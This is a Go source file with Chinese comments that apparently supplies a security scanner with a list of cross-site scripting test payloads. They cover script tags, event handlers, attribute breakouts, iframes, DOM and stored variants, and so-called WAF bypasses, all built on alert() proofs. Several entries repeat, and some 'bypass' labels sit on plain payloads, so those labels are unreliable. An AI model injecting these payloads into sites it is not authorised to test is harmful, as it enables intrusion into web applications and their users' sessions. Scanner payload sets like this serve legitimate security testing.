package payload

// XSSPayload XSS payload结构体
type XSSPayload struct {
	Payload     string
	Type        string
	Description string
	Severity    string
	Keywords    []string
	Context     string
}

// GetAdvancedXSSPayloads 获取高级XSS payload列表
func GetAdvancedXSSPayloads() []XSSPayload {
	return []XSSPayload{
		// 基础反射型XSS
		{
			Payload:     "<script>alert('XSS')</script>",
			Type:        "reflected",
			Description: "基础反射型XSS",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "XSS"},
			Context:     "script",
		},
		{
			Payload:     "<script>alert(String.fromCharCode(88,83,83))</script>",
			Type:        "reflected",
			Description: "字符编码反射型XSS",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "String.fromCharCode"},
			Context:     "script",
		},
		{
			Payload:     "<script>alert`XSS`</script>",
			Type:        "reflected",
			Description: "模板字符串反射型XSS",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "XSS"},
			Context:     "script",
		},
		// 事件处理器XSS
		{
			Payload:     "<img src=x onerror=alert('XSS')>",
			Type:        "event",
			Description: "图片onerror事件XSS",
			Severity:    "HIGH",
			Keywords:    []string{"<img", "onerror", "alert", "XSS"},
			Context:     "html",
		},
		{
			Payload:     "<svg onload=alert('XSS')>",
			Type:        "event",
			Description: "SVG onload事件XSS",
			Severity:    "HIGH",
			Keywords:    []string{"<svg", "onload", "alert", "XSS"},
			Context:     "html",
		},
		{
			Payload:     "<div onclick=alert('XSS')>click</div>",
			Type:        "event",
			Description: "div onclick事件XSS",
			Severity:    "HIGH",
			Keywords:    []string{"<div", "onclick", "alert", "XSS"},
			Context:     "html",
		},
		{
			Payload:     "<input onfocus=alert('XSS') autofocus>",
			Type:        "event",
			Description: "input onfocus事件XSS",
			Severity:    "HIGH",
			Keywords:    []string{"<input", "onfocus", "alert", "XSS", "autofocus"},
			Context:     "html",
		},
		{
			Payload:     "<body onload=alert('XSS')>",
			Type:        "event",
			Description: "body onload事件XSS",
			Severity:    "HIGH",
			Keywords:    []string{"<body", "onload", "alert", "XSS"},
			Context:     "html",
		},
		// 属性注入XSS
		{
			Payload:     "javascript:alert('XSS')",
			Type:        "attribute",
			Description: "JavaScript协议属性XSS",
			Severity:    "HIGH",
			Keywords:    []string{"javascript:", "alert", "XSS"},
			Context:     "url",
		},
		{
			Payload:     "';alert('XSS');//",
			Type:        "attribute",
			Description: "单引号闭合属性XSS",
			Severity:    "HIGH",
			Keywords:    []string{"';", "alert", "XSS", "//"},
			Context:     "attribute",
		},
		{
			Payload:     "\";alert('XSS');//",
			Type:        "attribute",
			Description: "双引号闭合属性XSS",
			Severity:    "HIGH",
			Keywords:    []string{"\";", "alert", "XSS", "//"},
			Context:     "attribute",
		},
		// 脚本标签闭合XSS
		{
			Payload:     "</script><script>alert('XSS')</script>",
			Type:        "script",
			Description: "脚本标签闭合XSS",
			Severity:    "HIGH",
			Keywords:    []string{"</script>", "<script>", "alert", "XSS"},
			Context:     "script",
		},
		{
			Payload:     "</script><img src=x onerror=alert('XSS')>",
			Type:        "script",
			Description: "脚本标签闭合后事件XSS",
			Severity:    "HIGH",
			Keywords:    []string{"</script>", "<img", "onerror", "alert", "XSS"},
			Context:     "script",
		},
		// 绕过WAF的payload
		{
			Payload:     "<ScRiPt>alert('XSS')</ScRiPt>",
			Type:        "bypass",
			Description: "大小写绕过WAF",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "XSS"},
			Context:     "script",
		},
		{
			Payload:     "<script>alert(String.fromCharCode(88,83,83))</script>",
			Type:        "bypass",
			Description: "字符编码绕过WAF",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "String.fromCharCode"},
			Context:     "script",
		},
		{
			Payload:     "<script>alert`XSS`</script>",
			Type:        "bypass",
			Description: "模板字符串绕过WAF",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "XSS"},
			Context:     "script",
		},
		{
			Payload:     "<script>alert(1)</script>",
			Type:        "bypass",
			Description: "简化payload绕过WAF",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "1"},
			Context:     "script",
		},
		{
			Payload:     "<script>alert(1)</script>",
			Type:        "bypass",
			Description: "简化payload绕过WAF",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "1"},
			Context:     "script",
		},
		// iframe XSS
		{
			Payload:     "<iframe src=javascript:alert('XSS')>",
			Type:        "iframe",
			Description: "iframe JavaScript协议XSS",
			Severity:    "HIGH",
			Keywords:    []string{"<iframe", "javascript:", "alert", "XSS"},
			Context:     "html",
		},
		{
			Payload:     "<iframe src=\"javascript:alert('XSS')\">",
			Type:        "iframe",
			Description: "iframe JavaScript协议XSS (引号)",
			Severity:    "HIGH",
			Keywords:    []string{"<iframe", "javascript:", "alert", "XSS"},
			Context:     "html",
		},
		// 特殊字符绕过
		{
			Payload:     "<script>alert('XSS')</script>",
			Type:        "special",
			Description: "特殊字符绕过",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "XSS"},
			Context:     "script",
		},
		{
			Payload:     "<script>alert('XSS')</script>",
			Type:        "special",
			Description: "特殊字符绕过",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "XSS"},
			Context:     "script",
		},
		// DOM型XSS
		{
			Payload:     "#<script>alert('XSS')</script>",
			Type:        "dom",
			Description: "DOM型XSS (hash)",
			Severity:    "MEDIUM",
			Keywords:    []string{"#", "<script>", "alert", "XSS"},
			Context:     "hash",
		},
		{
			Payload:     "?param=<script>alert('XSS')</script>",
			Type:        "dom",
			Description: "DOM型XSS (query)",
			Severity:    "MEDIUM",
			Keywords:    []string{"<script>", "alert", "XSS"},
			Context:     "query",
		},
		// 存储型XSS
		{
			Payload:     "<script>alert('XSS')</script>",
			Type:        "stored",
			Description: "存储型XSS",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "XSS"},
			Context:     "script",
		},
		{
			Payload:     "<img src=x onerror=alert('XSS')>",
			Type:        "stored",
			Description: "存储型图片XSS",
			Severity:    "HIGH",
			Keywords:    []string{"<img", "onerror", "alert", "XSS"},
			Context:     "html",
		},
		// 高级绕过技术
		{
			Payload:     "<script>alert(String.fromCharCode(88,83,83))</script>",
			Type:        "advanced",
			Description: "字符编码高级绕过",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "String.fromCharCode"},
			Context:     "script",
		},
		{
			Payload:     "<script>alert(1)</script>",
			Type:        "advanced",
			Description: "简化payload高级绕过",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "1"},
			Context:     "script",
		},
		{
			Payload:     "<script>alert(1)</script>",
			Type:        "advanced",
			Description: "简化payload高级绕过",
			Severity:    "HIGH",
			Keywords:    []string{"<script>", "alert", "1"},
			Context:     "script",
		},
	}
}
